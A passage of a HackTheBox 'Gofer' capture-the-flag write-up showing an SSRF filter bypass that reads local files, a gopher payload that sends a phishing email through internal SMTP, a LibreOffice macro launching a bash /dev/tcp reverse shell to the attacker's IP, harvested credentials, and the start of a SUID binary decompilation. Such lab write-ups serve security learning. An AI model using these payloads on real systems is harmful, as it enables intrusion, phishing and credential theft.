+</span></span></code></pre></div><h4 id="ssrf-file-read" class="relative group">SSRF File Read <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ssrf-file-read" aria-label="Anchor">#</a></span></h4><p>I made an effort to use <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#file" target="_blank" rel="noreferrer">different URIs</a>, including <code>file://</code>, but found that it was blacklisted.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb POST proxy.gofer.htb/index.php <span class="nv">url</span><span class="o">==</span>file:///etc/hostname
+</span></span><span class="line"><span class="cl">&lt;!-- Welcome to Gofer proxy --&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;&lt;body&gt;Blacklisted keyword: file:// !&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></div><p>However, I noticed that by using &ldquo;file:&rdquo; without the double slashes, I was able to make it work and dump the contents of <code>/etc/hostname</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb POST proxy.gofer.htb/index.php <span class="nv">url</span><span class="o">==</span>file:/etc/hostname
+</span></span><span class="line"><span class="cl">&lt;!-- Welcome to Gofer proxy --&gt;
+</span></span><span class="line"><span class="cl">gofer.htb
+</span></span><span class="line"><span class="cl"><span class="m">1</span>
+</span></span></code></pre></div><p>Using the same bypass, I successfully retrieved users with a login shells, and found four different users.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb POST proxy.gofer.htb/index.php <span class="nv">url</span><span class="o">==</span>file:/etc/passwd <span class="p">|</span> grep sh$
+</span></span><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">jhudson❌1000:1000:Jocelyn Hudson,,,:/home/jhudson:/bin/bash
+</span></span><span class="line"><span class="cl">jdavis❌1001:1001::/home/jdavis:/bin/bash
+</span></span><span class="line"><span class="cl">tbuckley❌1002:1002::/home/tbuckley:/bin/bash
+</span></span><span class="line"><span class="cl">ablake❌1003:1003::/home/ablake:/bin/bash
+</span></span></code></pre></div><p>I made an attempt to read the <code>.htaccess</code> and <code>.htpasswd</code> files for the proxy virtual host, which required basic authentication, but unfortunately, it didn&rsquo;t yield any useful information.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb POST proxy.gofer.htb/index.php <span class="nv">url</span><span class="o">==</span>file:/var/www/proxy/.htaccess
+</span></span><span class="line"><span class="cl">&lt;!-- Welcome to Gofer proxy --&gt;
+</span></span><span class="line"><span class="cl">RewriteEngine on
+</span></span><span class="line"><span class="cl">RewriteRule ^.+$ /index.php <span class="o">[</span>L<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; http -pb POST proxy.gofer.htb/index.php <span class="nv">url</span><span class="o">==</span>file:/var/www/proxy/.htpasswd
+</span></span><span class="line"><span class="cl">&lt;!-- Welcome to Gofer proxy --&gt;
+</span></span></code></pre></div><h4 id="ssrf-gofer" class="relative group">SSRF Gofer <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ssrf-gofer" aria-label="Anchor">#</a></span></h4><p>I&rsquo;m aware that there&rsquo;s an SMTP service running on the internal network. However, since I don&rsquo;t have control over the method or protocol for the SSRF request, I couldn&rsquo;t directly interact with the SMTP service. To work around this, I used <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher" target="_blank" rel="noreferrer">Gopher</a>, a protocol that allows communication with various TCP servers. Using the <a href="https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/" target="_blank" rel="noreferrer">Gopherus</a> tool I was able to generate a Gopher payload, enabling me to exploit the SSRF vulnerability and communicate with the internal SMTP server.</p>
+<p>The usernames on the server appear to follow the pattern of <code>$(FirstNameInitial)$(LastName)</code>. Given that the target user for the phishing attempt is Jocelyn and the only username starting with &lsquo;J&rsquo; is <code>jhudson</code>, it&rsquo;s reasonable to assume that this could be their username. This implies that the &lsquo;To&rsquo; email address would be <code>jhudson@gofer.htb</code>. In the message, I included a link to an ODT file hosted on my attack box.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; python2 gopherus.py --exploit smtp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  ________              .__
+</span></span><span class="line"><span class="cl"> /  _____/  ____ ______ <span class="p">|</span>  <span class="p">|</span>__   ___________ __ __  ______
+</span></span><span class="line"><span class="cl">/   <span class="se">\ </span> ___ /  _ <span class="se">\\</span>____ <span class="se">\|</span>  <span class="p">|</span>  <span class="se">\_</span>/ __ <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>  <span class="se">\/</span>  ___/
+</span></span><span class="line"><span class="cl"><span class="se">\ </span>   <span class="se">\_\ </span> <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="p">|</span>_&gt; &gt;   Y  <span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="p">|</span>  /<span class="se">\_</span>__ <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span> <span class="se">\_</span>_____  /<span class="se">\_</span>___/<span class="p">|</span>   __/<span class="p">|</span>___<span class="p">|</span>  /<span class="se">\_</span>__  &gt;__<span class="p">|</span>  <span class="p">|</span>____//____  &gt;
+</span></span><span class="line"><span class="cl">        <span class="se">\/</span>       <span class="p">|</span>__<span class="p">|</span>        <span class="se">\/</span>     <span class="se">\/</span>                 <span class="se">\/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        author: <span class="nv">$_SpyD3r_</span>$
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Give Details to send mail:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mail from :  abraxas@gofer.htb
+</span></span><span class="line"><span class="cl">Mail To :  jhudson@gofer.htb
+</span></span><span class="line"><span class="cl">Subject :  Definitely not a phishing attempt
+</span></span><span class="line"><span class="cl">Message :  Not malicious &lt;a <span class="nv">href</span><span class="o">=</span>http://10.10.14.132/exploit.odt&gt;link&lt;/a&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your gopher link is ready to send Mail:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gopher://127.0.0.1:25/_MAIL%20FROM:abraxas%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:abraxas%40gofer.htb%0ASubject:Definitely%20not%20a%20phishing%20attempt%0AMessage:Not%20malicious%20%3Ca%20href%3Dhttp://10.10.14.132/exploit.odt%3Elink%3C/a%3E%0A.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------Made-by-SpyD3r-----------
+</span></span></code></pre></div><h3 id="crafting-a-malicious-macro-for-odt" class="relative group">Crafting a malicious macro for ODT <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#crafting-a-malicious-macro-for-odt" aria-label="Anchor">#</a></span></h3><p>Now, that I have  way to communicate with the SMTP server, I need to craft an ODT file with a malicious macro. This <a href="https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html" target="_blank" rel="noreferrer">blog post</a> explains how to create the malicious macro.</p>
+<p>Step 1: A new macro can be created from the BASIC Macros option under Tools.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/create-new-macro.png" alt="create-new-macro" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Step 2: The macro follows Visual Basic, so the payload should be in VB. In this case, it&rsquo;s a simple shell function that executes a reverse shell payload.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/malicious-macro.png" alt="malicious-macro" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Step 3: Simply creating a new macro wouldn&rsquo;t be enough, the Macro needs to be executed when Jocelyn clicks on the link and opens it.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/execute-macro-on-open.png" alt="execute-macro-on-open" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>The macro needs to be assigned to malicious <code>odt</code> file for this to work properly.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/execute-macro-on-open.png" alt="execute-macro-on-open" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>While crafting this malicious file, I realized that a simple reverse shell payload like <code>bash -i &gt;&amp; /dev/tcp/$IP/$PORT 0&gt;&amp;1</code> didn&rsquo;t work. The file was retrieved from the local HTTP server, but the payload wouldn&rsquo;t be executed.</p>
+<pre tabindex="0"><code>Sub exploit
+    shell(&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.132/9005 0&gt;&amp;1&#34;)
+End Sub
+</code></pre><p>As per <a href="https://ask.libreoffice.org/t/how-to-use-shell-from-basic-macro-solved/23590" target="_blank" rel="noreferrer">LibreOffice&rsquo;s documentation</a>, the first parameter for <code>Shell()</code> is specified as <code>Pathname As String</code>. This is the reason the payload needs to be enclosed within a bash command string using <code>bash -c</code>.</p>
+<pre tabindex="0"><code>Sub exploit
+    shell(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.132/9005 0&gt;&amp;1&#39;&#34;)
+End Sub
+</code></pre><p>Using the previously created Gopherus payload for gofer and leveraging the SSRF vulnerability, I can now send the email to Jocelyn with the malicious file. The only modification required is to change the IP address from <code>127.0.0.1</code> to either <code>0.0.0.0</code> or simply <code>0</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb POST proxy.gofer.htb/index.php <span class="nv">url</span><span class="o">==</span>gopher://0.0.0.0:25/_MAIL%20FROM:abraxas%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:abraxas%40gofer.htb%0ASubject:Definitely%20not%20a%20phishing%20attempt%0AMessage:Not%20malicious%20%3Ca%20href%3Dhttp://10.10.14.132/revShell.odt%3Elink%3C/a%3E%0A.
+</span></span><span class="line"><span class="cl">&lt;!-- Welcome to Gofer proxy --&gt;
+</span></span><span class="line"><span class="cl"><span class="m">220</span> gofer.htb ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.0 Ok
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.5 Ok
+</span></span><span class="line"><span class="cl"><span class="m">354</span> End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.0.0 Ok: queued as 4ED0C66EF
+</span></span><span class="line"><span class="cl"><span class="m">421</span> 4.4.2 gofer.htb Error: timeout exceeded
+</span></span><span class="line"><span class="cl"><span class="m">1</span>
+</span></span></code></pre></div><p>After a brief wait, I successfully obtained a shell as <code>jhudson</code>. It is highly likely that this occurred because they clicked on the link in the email.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; pc -lp <span class="m">9005</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>13:46:39<span class="o">]</span> Welcome to pwncat 🐈!                                                                    __main__.py:164
+</span></span><span class="line"><span class="cl"><span class="o">[</span>13:47:06<span class="o">]</span> received connection from 10.10.11.225:35422                                                   bind.py:84
+</span></span><span class="line"><span class="cl"><span class="o">[</span>13:47:08<span class="o">]</span> 0.0.0.0:9005: normalizing shell path                                                      manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">[</span>13:47:10<span class="o">]</span> 10.10.11.225:35422: registered new host w/ db                                             manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$
+</span></span><span class="line"><span class="cl">You have mail in /var/mail/jhudson
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> jhudson@gofer.htb:/usr/bin$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jhudson<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jhudson<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>jhudson<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> jhudson@gofer.htb:/usr/bin$
+</span></span></code></pre></div><hr>
+<h2 id="privilege-escalation-to-jhudson" class="relative group">Privilege Escalation to jhudson <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-to-jhudson" aria-label="Anchor">#</a></span></h2><hr>
+<p>I decided to investigate the <code>/var/mail</code> directory, given the presence of an internal mail server. However, I couldn&rsquo;t access any other mails within that directory due to permission issues.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> jhudson@gofer.htb:/usr/bin$ ls -la /var/mail/
+</span></span><span class="line"><span class="cl">total <span class="m">12</span>
+</span></span><span class="line"><span class="cl">drwxrwsr-x  <span class="m">2</span> root    mail <span class="m">4096</span> Aug  <span class="m">9</span> 09:16 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">12</span> root    root <span class="m">4096</span> Jul <span class="m">19</span> 12:44 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root    mail    <span class="m">9</span> Nov  <span class="m">3</span>  <span class="m">2022</span> ablake -&gt; /dev/null
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root    mail    <span class="m">9</span> Nov  <span class="m">3</span>  <span class="m">2022</span> jdavis -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r-----  <span class="m">1</span> jhudson mail    <span class="m">1</span> Aug  <span class="m">9</span> 09:25 jhudson
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root    mail    <span class="m">9</span> Nov  <span class="m">3</span>  <span class="m">2022</span> root -&gt; /dev/null
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root    mail    <span class="m">9</span> Nov  <span class="m">3</span>  <span class="m">2022</span> tbuckley -&gt; /dev/null
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> jhudson@gofer.htb:/usr/bin$ cat /var/mail/jhudson
+</span></span></code></pre></div><p>When attempting to check for sudo privileges, I noticed an unusual absence of the <code>sudo</code> binary in the shell. This suggests the possibility of a restricted environment.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> jhudson@gofer.htb:/home/jhudson$ sudo -l
+</span></span><span class="line"><span class="cl">bash: sudo: <span class="nb">command</span> not found
+</span></span></code></pre></div><p>Looking for background processes, found a recurring request to the proxy vhost along with credentials for basic authentication.
+While searching for background processes using <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noreferrer">pspy</a>, I discovered a recurring request to the proxy virtual host, and within it, I found credentials for basic authentication → <code>tbuckley:ooP4dietie3o_hquaeti</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">2023/08/09 09:33:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">5521</span>   <span class="p">|</span> /usr/sbin/CRON -f
+</span></span><span class="line"><span class="cl">2023/08/09 09:33:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">5522</span>   <span class="p">|</span> /bin/bash /root/scripts/curl.sh
+</span></span><span class="line"><span class="cl">2023/08/09 09:33:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">5523</span>   <span class="p">|</span> /usr/bin/curl http://proxy.gofer.htb/?url<span class="o">=</span>http://gofer.htb --user tbuckley:ooP4dietie3o_hquaeti
+</span></span><span class="line"><span class="cl">2023/08/09 09:33:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">5526</span>   <span class="p">|</span> /usr/sbin/CRON -f
+</span></span><span class="line"><span class="cl">2023/08/09 09:33:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">5527</span>   <span class="p">|</span> /usr/sbin/CRON -f
+</span></span><span class="line"><span class="cl">2023/08/09 09:33:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">5528</span>   <span class="p">|</span> /usr/sbin/postdrop -r
+</span></span><span class="line"><span class="cl">2023/08/09 09:33:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">5529</span>   <span class="p">|</span> /bin/bash /root/scripts/mail.sh
+</span></span><span class="line"><span class="cl">2023/08/09 09:33:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">5530</span>   <span class="p">|</span> /usr/bin/grep -Eo http://<span class="o">[</span>^ &gt;<span class="o">]</span>+ /var/mail/jhudson
+</span></span></code></pre></div><p>The credentials I found were reused for SSH access to the <code>tbuckley</code> user account. It&rsquo;s interesting to note that <code>tbuckley</code> is also part of the <code>dev</code> group.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/home/tbuckley$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>tbuckley<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>tbuckley<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>tbuckley<span class="o">)</span>,1004<span class="o">(</span>dev<span class="o">)</span>
+</span></span></code></pre></div><hr>
+<h2 id="privilege-escalation-to-root" class="relative group">Privilege Escalation to root <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-to-root" aria-label="Anchor">#</a></span></h2><hr>
+<p>Since <code>tbuckley</code> belongs to the <code>dev</code> group, I looked for all files owned by that group and discovered a binary with the SUID bit enabled. It appears to be a menu driven note taking program.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/home/tbuckley$ find / -group dev 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/local/bin/notes
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/home/tbuckley$ ls -al /usr/local/bin/notes
+</span></span><span class="line"><span class="cl">-rwsr-s--- <span class="m">1</span> root dev <span class="m">17168</span> Apr <span class="m">28</span> 16:06 /usr/local/bin/notes
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/var/mail$ file /usr/local/bin/notes
+</span></span><span class="line"><span class="cl">/usr/local/bin/notes: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="o">[</span>sha1<span class="o">]=</span>6a9c0faa06eabfa48a864bb7341f29deecd7e9e3, <span class="k">for</span> GNU/Linux 3.2.0, not stripped
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/home/tbuckley$ /usr/local/bin/notes
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">1<span class="o">)</span> Create an user and choose an username
+</span></span><span class="line"><span class="cl">2<span class="o">)</span> Show user information
+</span></span><span class="line"><span class="cl">3<span class="o">)</span> Delete an user
+</span></span><span class="line"><span class="cl">4<span class="o">)</span> Write a note
+</span></span><span class="line"><span class="cl">5<span class="o">)</span> Show a note
+</span></span><span class="line"><span class="cl">6<span class="o">)</span> Save a note <span class="o">(</span>not yet implemented<span class="o">)</span>
+</span></span><span class="line"><span class="cl">7<span class="o">)</span> Delete a note
+</span></span><span class="line"><span class="cl">8<span class="o">)</span> Backup notes
+</span></span><span class="line"><span class="cl">9<span class="o">)</span> <span class="nv">Quit</span>
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your choice:
+</span></span></code></pre></div><p>Interestingly, option 8, which is related to the notes backup, demands the admin role for access.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">1<span class="o">)</span> Create an user and choose an username
+</span></span><span class="line"><span class="cl">2<span class="o">)</span> Show user information
+</span></span><span class="line"><span class="cl">3<span class="o">)</span> Delete an user
+</span></span><span class="line"><span class="cl">4<span class="o">)</span> Write a note
+</span></span><span class="line"><span class="cl">5<span class="o">)</span> Show a note
+</span></span><span class="line"><span class="cl">6<span class="o">)</span> Save a note <span class="o">(</span>not yet implemented<span class="o">)</span>
+</span></span><span class="line"><span class="cl">7<span class="o">)</span> Delete a note
+</span></span><span class="line"><span class="cl">8<span class="o">)</span> Backup notes
+</span></span><span class="line"><span class="cl">9<span class="o">)</span> <span class="nv">Quit</span>
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your choice: <span class="m">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Access denied: you don<span class="err">&#39;</span>t have the admin role!
+</span></span></code></pre></div><h3 id="analyzing-the-notes-binary" class="relative group">Analyzing the notes binary <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analyzing-the-notes-binary" aria-label="Anchor">#</a></span></h3><p>Given that this is an unstripped executable, strings might uncover valuable information. It&rsquo;s worth noting that just before the error message for the backup operation, there&rsquo;s an execution of a <code>tar</code> archive command, which compresses the <code>/opt/notes</code> directory into a <code>tar.gz</code> file located in the <code>/root/</code> directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tbuckley@gofer.htb:/home/tbuckley$ strings -n <span class="m">15</span> /usr/local/bin/notes
+</span></span><span class="line"><span class="cl">/lib64/ld-linux-x86-64.so.2
+</span></span><span class="line"><span class="cl">__libc_start_main
+</span></span><span class="line"><span class="cl">_ITM_deregisterTMCloneTable
+</span></span><span class="line"><span class="cl"><span class="nv">_ITM_registerTMCloneTable</span>
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">1<span class="o">)</span> Create an user and choose an username
+</span></span><span class="line"><span class="cl">2<span class="o">)</span> Show user information
+</span></span><span class="line"><span class="cl">3<span class="o">)</span> Delete an user
+</span></span><span class="line"><span class="cl">4<span class="o">)</span> Write a note
+</span></span><span class="line"><span class="cl">6<span class="o">)</span> Save a note <span class="o">(</span>not yet implemented<span class="o">)</span>
+</span></span><span class="line"><span class="cl">7<span class="o">)</span> Delete a note
+</span></span><span class="line"><span class="cl">8<span class="o">)</span> Backup <span class="nv">notes</span>
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">Choose an username:
+</span></span><span class="line"><span class="cl">First create an user!
+</span></span><span class="line"><span class="cl">Write your note:
+</span></span><span class="line"><span class="cl">Access granted!
+</span></span><span class="line"><span class="cl">tar -czvf /root/backups/backup_notes.tar.gz /opt/notes
+</span></span><span class="line"><span class="cl">Access denied: you don<span class="err">&#39;</span>t have the admin role!
+</span></span></code></pre></div><p>Since, strings didn&rsquo;t provide substantial information, I proceeded to decompiled the binary using Ghidra for a more in-depth analysis. I also renamed a few variables to make the code more readable.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/ghidra-decompilation.png" alt="ghidra-decompilation" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>At the beginning of the main function, two pointers, namely <code>note_var</code> and <code>username</code>, are defined and cleared by setting it to null references.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="n">choice</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">note_var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">choice</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">note_var</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+</span></span></code></pre></div><p>Case 1 is for creating a new user,</p>
+<ul>
+<li><code>username</code> is allocated 40 bytes of memory using <code>malloc(0x28)</code>.</li>
+<li>The first 24 bytes of memory (0x18) are initialized with zeros using <code>memset</code>.</li>
+<li>The next 16 bytes (0x10) are also set to zeros.</li>
+<li>If the binary is executed with superuser privileges (uid is 0).
+<ul>
+<li>it writes the values <code>0x696d6461</code> and <code>0x6e</code> to the <code>username</code> buffer at an offset of 28 bytes. These values correspond to the <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex%28%27Auto%27%29Reverse%28%27Character%27%29&amp;input=MHg2ZTB4Njk2ZDY0NjE" target="_blank" rel="noreferrer">string</a> &ldquo;admin&rdquo;.</li>
+</ul>
+</li>
+<li>Else the username buffer is set to user.</li>
+<li>This means the role required is at an offset of 24 bytes in the username buffer, <code>*username + 0x18</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">username</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">username</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">username</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">uid</span> <span class="o">=</span> <span class="nf">getuid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
